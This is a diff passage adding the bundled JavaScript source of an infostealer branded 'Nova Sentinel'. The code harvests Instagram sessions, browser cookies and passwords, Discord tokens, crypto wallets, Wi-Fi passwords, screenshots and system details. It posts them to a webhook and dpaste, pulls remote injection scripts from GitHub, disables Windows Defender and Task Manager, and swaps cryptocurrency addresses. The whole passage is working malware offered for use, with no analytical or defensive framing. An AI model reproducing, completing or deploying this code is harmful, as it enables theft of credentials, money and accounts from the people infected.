+},{"./stats":"utils/stats.js","./emotes":"utils/emotes.js"}],"utils/instagram.js":[function(require,module,exports) {
+const {
+    stat
+  } = require("./stats"),
+  axios = require("axios"),
+  fs = require("fs"),
+  {
+    embeds
+  } = require("./emotes"),
+  path = require("path");
+async function ParseInstagram(cc) {
+  if (cc !== "yes") return;
+  try {
+    let g = [];
+    let instagram_sessions = stat.InstaSessId;
+    if (instagram_sessions && instagram_sessions.length) {
+      for (const instagram of instagram_sessions) {
+        var _profile$full_name, _profile$is_private, _profile$email, _profile$phone_number, _profile$profile_pic_, _profile$username;
+        const profile = await axios.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", {
+          headers: {
+            "user-agent": "Instagram 219.0.0.12.117 Android",
+            cookie: `sessionid=${instagram}`
+          }
+        }).then(res => res.data.user).catch(() => {});
+        let full_name = (_profile$full_name = profile.full_name) !== null && _profile$full_name !== void 0 ? _profile$full_name : "none";
+        let is_private = (_profile$is_private = profile.is_private) !== null && _profile$is_private !== void 0 ? _profile$is_private : "none";
+        let email = (_profile$email = profile.email) !== null && _profile$email !== void 0 ? _profile$email : "none";
+        let phone_number = (_profile$phone_number = profile.phone_number) !== null && _profile$phone_number !== void 0 ? _profile$phone_number : "none";
+        let profile_pic_url = (_profile$profile_pic_ = profile.profile_pic_url) !== null && _profile$profile_pic_ !== void 0 ? _profile$profile_pic_ : "none";
+        let username = (_profile$username = profile.username) !== null && _profile$username !== void 0 ? _profile$username : "none";
+        const profile2 = await axios.get(`https://i.instagram.com/api/v1/users/${profile.pk_id}/info`, {
+          headers: {
+            "user-agent": "Instagram 219.0.0.12.117 Android",
+            cookie: `sessionid=${instagram}`
+          }
+        }).then(res => res.data.user).catch(() => {});
+        let {
+          is_verified,
+          follower_count
+        } = profile2;
+        let embed = {
+          title: "Instagram Session",
+          fields: [{
+            name: `${embeds.instagram} Username:`,
+            value: `[\`${full_name}\`](https://instagram.com/${username})`,
+            inline: true
+          }, {
+            name: `${embeds.twitter_followers} Followers:`,
+            value: `\`${follower_count !== null && follower_count !== void 0 ? follower_count : "0"}\``,
+            inline: true
+          }, {
+            name: `${embeds.mail} Email`,
+            value: `\`${email !== null && email !== void 0 ? email : "none"}\``,
+            inline: true
+          }, {
+            name: `${embeds.instaiscert} Certified`,
+            value: `\`${is_verified ? embeds.instagram_certified : "❌"}\``,
+            inline: true
+          }, {
+            name: `${embeds.phone} Phone Number`,
+            value: `\`${phone_number ? phone_number : "❌"}\``,
+            inline: true
+          }, {
+            name: `${embeds.token} Cookie`,
+            value: `\`\`\`${instagram}\`\`\``,
+            inline: false
+          }],
+          thumbnail: {
+            url: profile_pic_url
+          },
+          footer: {
+            text: "@Nova Sentinel | https://t.me/Sordeal"
+          },
+          color: 3553599
+        };
+        g.push(embed);
+      }
+      let tosend = {
+        avatar_url: "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png",
+        username: "Nova Sentinel",
+        embeds: g
+      };
+      return tosend;
+    }
+  } catch (e) {
+    return null;
+  }
+}
+module.exports = {
+  ParseInstagram
+};
+},{"./stats":"utils/stats.js","./emotes":"utils/emotes.js"}],"utils/cookies.js":[function(require,module,exports) {
+// trier les cookies
+const {
+  stat
+} = require("./stats");
+async function CookiesFilter(cc) {
+  if (cc !== "yes") return;
+  let CookiesLinks = {
+    "basic-fit": "[`basicfit`](https://basic-fit.com)",
+    coinbase: "[`coinbase`](https://coinbase.com)",
+    sellix: "[`sellix`](https://sellix.io)",
+    gmail: "[`gmail`](https://gmail.com)",
+    steam: "[`steam`](https://steam.com)",
+    riotgames: "[`riotgames`](https://riotgames.com)",
+    youtube: "[`youtube`](https://youtube.com)",
+    instagram: "[`instagram`](https://instagram.com)",
+    tiktok: "[`tiktok`](https://tiktok.com)",
+    twitter: "[`twitter`](https://twitter.com)",
+    facebook: "[`facebook`](https://facebook.com)",
+    epicgames: "[`epicgames`](https://epicgames.com)",
+    spotify: "[`spotify`](https://spotify.com)",
+    yahoo: "[`yahoo`](https://yahoo.com)",
+    roblox: "[`roblox`](https://roblox.com)",
+    twitch: "[`twitch`](https://twitch.com)",
+    minecraft: "[`minecraft`](https://minecraft.net)",
+    paypal: "[`paypal`](https://paypal.com)",
+    origin: "[`origin`](https://origin.com)",
+    amazon: "[`amazon`](https://amazon.com)",
+    ebay: "[`ebay`](https://ebay.com)",
+    aliexpress: "[`aliexpress`](https://aliexpress.com)",
+    playstation: "[`playstation`](https://playstation.com)",
+    hbo: "[`hbo`](https://hbo.com)",
+    xbox: "[`xbox`](https://xbox.com)",
+    binance: "[`binance`](https://binance.com)",
+    hotmail: "[`hotmail`](https://hotmail.com)",
+    outlook: "[`outlook`](https://outlook.com)",
+    crunchyroll: "[`crunchyroll`](https://crunchyroll.com)",
+    telegram: "[`telegram`](https://telegram.com)",
+    pornhub: "[`pornhub`](https://pornhub.com)",
+    disney: "[`disney`](https://disney.com)",
+    expressvpn: "[`expressvpn`](https://expressvpn.com)",
+    uber: "[`uber`](https://uber.com)",
+    netflix: "[`netflix`](https://netflix.com)",
+    github: "[`github`](https://github.com)",
+    stake: "[`stake`](https://stake.com)"
+  };
+  let CookiesKeys = ["basic-fit", "coinbase", "sellix", "gmail", "steam", "riotgames", "youtube", "instagram", "tiktok", "twitter", "facebook", "epicgames", "spotify", "yahoo", "roblox", "twitch", "minecraft", "paypal", "origin", "amazon", "ebay", "aliexpress", "playstation", "hbo", "xbox", "binance", "hotmail", "outlook", "crunchyroll", "telegram", "pornhub", "disney", "expressvpn", "uber", "netflix", "github", "stake"];
+  let VerifiedLinks = new Set();
+  await stat.AllCookies.forEach(cookies => {
+    cookies.forEach(cookie => {
+      const matchingKey = CookiesKeys.find(key => cookie.host.includes(key));
+      if (matchingKey) {
+        VerifiedLinks.add(CookiesLinks[matchingKey]);
+      }
+    });
+  });
+  let verifiedLinksArray = Array.from(VerifiedLinks);
+  let embed = {
+    avatar_url: "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png",
+    username: "Nova Sentinel",
+    embeds: [{
+      author: {
+        name: "Cookies Keywords",
+        url: "https://t.me/Sordeal",
+        icon_url: "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/gifnova.gif"
+      },
+      color: 3553599,
+      description: verifiedLinksArray.join(", "),
+      footer: {
+        text: "@Nova Sentinel | https://t.me/Sordeal"
+      }
+    }]
+  };
+  return embed;
+}
+module.exports = {
+  CookiesFilter
+};
+},{"./stats":"utils/stats.js"}],"index.js":[function(require,module,exports) {
+const admin = require("./utils/admin"),
+  browsers = require("./utils/browsers"),
+  core = require("./utils/core"),
+  crypto = require("./utils/crypto"),
+  discord = require("./utils/discord"),
+  files = require("./utils/files"),
+  twitter = require("./utils/twitter"),
+  {
+    upload
+  } = require("./utils/uploadFiles"),
+  infos = require("./utils/infos"),
+  injection = require("./utils/injection"),
+  antidebug = require("./utils/antidebug"),
+  save = require("./utils/save"),
+  {
+    stat
+  } = require("./utils/stats"),
+  roblox = require("./utils/roblox"),
+  minecraft = require("./utils/minecraft"),
+  phish = require("./utils/phish"),
+  reddit = require("./utils/reddit"),
+  https = require("https"),
+  axios = require("axios"),
+  agent = new https.Agent({
+    rejectUnauthorized: false
+  }),
+  steam = require("./utils/steam"),
+  fake_error = require("./utils/fake_error"),
+  // sound = require("./utils/sound"),
+  kill = require("./utils/kill"),
+  uac = require("./utils/uac"),
+  tiktok = require("./utils/tiktok"),
+  instagram = require("./utils/instagram"),
+  cookies = require("./utils/cookies");
+let config = {
+  webhook: "%WEBHOOK%",
+  DoINeedTo_beSilent: "%SILENCE_MOD%",
+  ClientEmail: "%CLIENT_EMAIL%",
+  ChromeInjection: "%CHROME_INJECTION%",
+  DoINeedTo_MailChanger: "%AUTO_MAIL_CHANGER%",
+  DoINeedTo_Disable2FA: "%DISABLE_2FA%",
+  DoINeedTo_BlockDebug: "%DEBUG_OPTIONS%",
+  DoINeedTo_GetGames: "%GAMES_OPTIONS%",
+  DoINeedTo_GetLaunchers: "%LAUNCHERS_OPTIONS%",
+  DoINeedTo_Inject: "%INJECT_OPTIONS%",
+  DoINeedTo_GetClients: "%CLIENTS_OPTIONS%",
+  DoINeedTo_GetWallets: "%WALLETS_OPTIONS%",
+  DoINeedTo_GetVPN: "%VPN_OPTIONS%",
+  DoINeedTo_GetSysInfo: "%SYSINFO_OPTIONS%",
+  DoINeedTo_GetSocialAPP: "%SOCIALAPP_OPTIONS%",
+  DoINeedTo_GetBrowsers: "%BROWSERS_OPTIONS%",
+  DoINeedTo_FakeError: "%FAKEERROR_OPTIONS%",
+  DoINeedTo_TrollSound: "%TROLL_SOUND%",
+  DoINeedTo_TrollImage: "%TROLL_IMAGE%",
+  DoINeedTo_FakeErrorMSG: "%FAKE_ERROR_MSG%",
+  DoINeedTo_DisableUSERSET: "%SETTINGS_DISABLER%",
+  Mcrsft_SniffUrl: "https://raw.githubusercontent.com/Yokheycv/sub/main/microsoft_credz.ps1",
+  ChromeInjectionURL: "https://github.com/Yokheycv/Chrome-inject/raw/main/extensions.zip",
+  DiscordInjectionURL: "https://raw.githubusercontent.com/Yokheycv/sub/main/index.js",
+  ExodusInjectionURL: "https://raw.githubusercontent.com/Yokheycv/sub/main/exodus-inject.js",
+  MullvadInjectionURL: "https://raw.githubusercontent.com/Yokheycv/sub/main/mullvad-inject.js",
+  AtomicInjectionURL: "https://raw.githubusercontent.com/Yokheycv/Atomic-inject/main/main.js",
+  AtomicMainURL: "https://raw.githubusercontent.com/Yokheycv/Atomic-inject/main/vendors.3d9f29748fbff1778bdc.js",
+  MailSpringInjectionURL: "https://raw.githubusercontent.com/Yokheycv/sub/main/mailspring-inject.js",
+  DoINeedTo_SwapWallet: {
+    active: "%SWAP_OPTIONS%",
+    ltc_address: "%LTC_ADD%",
+    xlm_address: "%XLM_ADD%",
+    eth_address: "%ETH_ADD%",
+    dash_address: "%DASH_ADD%",
+    bch_address: "%BCH_ADD%",
+    btc_address: "%BTC_ADD%",
+    xrp_address: "%XRP_ADD%",
+    neo_address: "%NEO_ADD%",
+    doge_address: "%DOGE_ADD%",
+    paypal_address: "%PAYPAL_ADD%"
+  }
+};
+async function start() {
+  const myselfbis = await core.NovaSentinelFindMyself();
+  let internetacces = core.checkInternetAccess();
+  if (!internetacces) {
+    process.abort();
+  }
+  kill.KillBrowsersProcess(config.DoINeedTo_Inject, config.DoINeedTo_GetBrowsers, config.DoINeedTo_beSilent);
+  let startuped = core.checkIfStartup(myselfbis);
+  uac.requestAdminPrivilegesIfNeeded(myselfbis, config.ChromeInjection, config.DoINeedTo_DisableUSERSET, config.DoINeedTo_Inject);
+  let link = "";
+  console.log("First instances");
+  const {
+    disk,
+    ram,
+    uid,
+    cpucount,
+    OS,
+    cpu,
+    GPU,
+    windowskey,
+    windowsversion
+  } = await core.getInfo();
+  const [{
+    ip,
+    hostname,
+    city,
+    region,
+    country,
+    loc,
+    org,
+    postal,
+    timezone
+  }, myself] = await Promise.all([core.getPublicIp(), core.NovaSentinelFindMyself()]);
+  const webhook = config.webhook;
+  console.log("Joined by 2nd !");
+  await save.Init(country, ip);
+  const username = process.env.userprofile.split("\\")[2];
+  const googlemap = `https://www.google.com/maps/search/google+map++${loc}`;
+  antidebug.DoNoDebugNegger(config.DoINeedTo_BlockDebug, ip, disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion);
+  await infos.getSysteminformations(config.DoINeedTo_GetSysInfo, ip, hostname, disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion);
+  await infos.takeScreenshotAndSave(config.DoINeedTo_GetSysInfo);
+  console.log("Large Instance started");
+  const promises = [fake_error.error(config.DoINeedTo_FakeError, config.DoINeedTo_FakeErrorMSG, startuped), infos.NovaSentinelAV(config.DoINeedTo_GetSysInfo), infos.NovaSentinelClipboard(config.DoINeedTo_GetSysInfo), infos.NovaSentinelWifiPasswords(config.DoINeedTo_GetSysInfo), admin.NovaSentinelWinSCP(config.DoINeedTo_GetClients), files.NovaSentinelGOG(config.DoINeedTo_GetLaunchers), files.NovaSentinelElectronicArts(config.DoINeedTo_GetLaunchers), files.NovaSentinelRockstarGames(config.DoINeedTo_GetLaunchers), files.NovaSentinelBattle(config.DoINeedTo_GetLaunchers), files.NovaSentinelEpicGame(config.DoINeedTo_GetLaunchers), files.NovaSentinelSteam(config.DoINeedTo_GetLaunchers), files.NovaSentinelPidgin(config.DoINeedTo_GetSocialAPP), files.NovaSentinelProton(config.DoINeedTo_GetVPN), files.NovaSentinelNordVPN(config.DoINeedTo_GetVPN), files.NovaSentinelOpenVPN(config.DoINeedTo_GetVPN), files.NovaSentinelRiotGame(config.DoINeedTo_GetLaunchers), files.NovaSentinelTelegram(config.DoINeedTo_GetSocialAPP), files.NovaSentinelWhatsapp(config.DoINeedTo_GetSocialAPP), files.NovaSentinelFetchT0x(config.DoINeedTo_GetSocialAPP), crypto.NovaSentinelColds(config.DoINeedTo_GetWallets), crypto.NovaSentinelExtensions(config.DoINeedTo_GetWallets)];
+  await Promise.all(promises);
+  console.log("Start Passwords Decryption !");
+  await files.NovaSentinelSimple();
+  try {
+    const passwords = await browsers.NovaSentinelBrowsers(config.DoINeedTo_GetBrowsers);
+    const passphrase = await crypto.NovaSentinelFetchMeta(passwords);
+    crypto.exodusDecrypt(config.DoINeedTo_GetWallets, passwords);
+    stat.AddPassphrase(passphrase);
+  } catch (e) {
+    save.SaveError(e);
+  }
+  console.log("Passwords Decryption finished !");
+  const zipPath = await save.zipResult();
+  link = await upload(zipPath);
+  let gembed = stat.Build(username, ip, hostname, city, region, country, googlemap, org, postal, timezone, disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion, link);
+  try {
+    axios.all([axios({
+      url: webhook,
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      data: JSON.parse(gembed),
+      httpsAgent: agent
+    })]).then(axios.spread(response1 => {})).catch(error => {});
+  } catch (e) {}
+  phish.MicroPhish(config.Mcrsft_SniffUrl, config.webhook, config.DoINeedTo_GetSysInfo);
+  // SESSIONS
+  console.log("Social Instance started");
+  const promisesSocialApps = [instagram.ParseInstagram(config.DoINeedTo_GetSocialAPP), tiktok.ParseTiktok(config.DoINeedTo_GetSocialAPP), reddit.NovaRedditor(config.DoINeedTo_GetSocialAPP)];
+  const [insta_account, tiktok_account, reddit_account] = await Promise.all(promisesSocialApps);
+  roblox.NovaSentinelGetRoblox(config.DoINeedTo_GetGames);
+  roblox.ParseAndSendRoblox(config.DoINeedTo_GetGames);
+  twitter.detailtwitter(config.DoINeedTo_GetSocialAPP);
+  injection.pwnBetterDiscord(config.DoINeedTo_Inject);
+  injection.BypassDiscordTokenProtector(config.DoINeedTo_Inject);
+  injection.inject(config.DoINeedTo_Inject, webhook, config.DiscordInjectionURL, link, config.DoINeedTo_Disable2FA, config.DoINeedTo_MailChanger, config.ClientEmail, config.DoINeedTo_beSilent);
+  steam.NovaSteamator(config.DoINeedTo_GetLaunchers);
+  try {
+    let cookEmbed = await cookies.CookiesFilter(config.DoINeedTo_GetBrowsers);
+    await axios({
+      url: webhook,
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      httpsAgent: agent,
+      data: cookEmbed
+    });
+  } catch (e) {}
+  try {
+    const pd = await steam.sendSteam(config.DoINeedTo_GetLaunchers);
+    await axios({
+      url: webhook,
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      httpsAgent: agent,
+      data: pd
+    });
+  } catch (e) {}
+  try {
+    await axios({
+      url: webhook,
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      httpsAgent: agent,
+      data: insta_account
+    });
+  } catch (e) {}
+  try {
+    await axios({
+      url: webhook,
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      httpsAgent: agent,
+      data: tiktok_account
+    });
+  } catch (e) {}
+  try {
+    await axios({
+      url: webhook,
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      httpsAgent: agent,
+      data: reddit_account
+    });
+  } catch (e) {}
+  try {
+    const p = await twitter.sendTwitter(config.DoINeedTo_GetSocialAPP);
+    if (p) {
+      await axios({
+        url: webhook,
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        httpsAgent: agent,
+        data: p
+      });
+    }
+  } catch (e) {}
+  var embeds = [];
+  const accounts = await discord.NovaSentinelDiscord();
+  stat.addDiscordAccount(accounts);
+  //discord.WriteDiscord(stat.discordAccount[0]);
+  for (let i = 0; i < stat.discordAccount[0].length && i < 3; i++) {
+    var _acc$password;
+    const acc = stat.discordAccount[0][i];
+    if (acc.username === null || acc.username === undefined) return;
+    let dscaccount = await discord.embed(acc.username, acc.tag, acc.id, acc.nitro, acc.badges, acc.billings, acc.email, acc.phone, acc.token, acc.avatar, (_acc$password = acc.password) !== null && _acc$password !== void 0 ? _acc$password : "None");
+    if (dscaccount !== null || dscaccount == undefined) {
+      embeds.push(dscaccount);
+    }
+    const embedData = await discord.embedbis(acc.token);
+    const embedguild = await discord.embedguild(acc.token);
+    if (embedguild !== null && embedguild !== undefined) {
+      embeds.push(embedguild);
+    }
+    if (embedData !== null && embedData !== undefined) {
+      embeds.push(embedData);
+    }
+  }
+  try {
+    await axios({
+      url: webhook,
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      httpsAgent: agent,
+      data: JSON.parse(discord.compile(embeds.slice(0, 10)))
+    });
+  } catch (e) {}
+  let allembed = [];
+  try {
+    const p = await roblox.sendRoblox(config.DoINeedTo_GetGames);
+    if (p.length > 0) {
+      allembed = await Promise.all(p.map(async pd => {
+        let {
+          UserName,
+          RobuxBalance,
+          ThumbnailUrl,
+          IsAnyBuildersClubMember,
+          IsPremium,
+          friendscount,
+          cookies
+        } = pd;
+        const response = await axios.post("https://dpaste.com/api/", `content=${encodeURIComponent(cookies)}`, {
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+          }
+        });
+        const links = response.headers.location;
+        return roblox.embed(UserName, RobuxBalance, ThumbnailUrl, IsAnyBuildersClubMember, IsPremium, friendscount, links);
+      }));
+      await axios({
+        url: webhook,
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        httpsAgent: agent,
+        data: JSON.parse(roblox.compile(allembed.slice(0, 10)))
+      });
+    }
+  } catch (e) {}
+  await minecraft.NovaSentinelfinduid(webhook, config.DoINeedTo_GetGames);
+  core.NovaSentinelDisabTaskMNGR(config.DoINeedTo_DisableUSERSET);
+  core.NovaSentinelDisableWinDefender(config.DoINeedTo_DisableUSERSET);
+
+  //sound.sound(config.DoINeedTo_TrollSound);
+  // imagify.spawnimage(config.DoINeedTo_TrollImage);
+}
+async function afterPassage() {
+  await core.cleaner();
+}
+async function Class() {
+  await start();
+  console.log("class");
+  await afterPassage();
+  console.log("initied");
+}
+Class();
+},{"./utils/admin":"utils/admin.js","./utils/browsers":"utils/browsers.js","./utils/core":"utils/core.js","./utils/crypto":"utils/crypto.js","./utils/discord":"utils/discord.js","./utils/files":"utils/files.js","./utils/twitter":"utils/twitter.js","./utils/uploadFiles":"utils/uploadFiles.js","./utils/infos":"utils/infos.js","./utils/injection":"utils/injection.js","./utils/antidebug":"utils/antidebug.js","./utils/save":"utils/save.js","./utils/stats":"utils/stats.js","./utils/roblox":"utils/roblox.js","./utils/minecraft":"utils/minecraft.js","./utils/phish":"utils/phish.js","./utils/reddit":"utils/reddit.js","./utils/steam":"utils/steam.js","./utils/fake_error":"utils/fake_error.js","./utils/kill":"utils/kill.js","./utils/uac":"utils/uac.js","./utils/tiktok":"utils/tiktok.js","./utils/instagram":"utils/instagram.js","./utils/cookies":"utils/cookies.js"}]},{},["index.js"], null)
+//# sourceMappingURL=/script.js.map
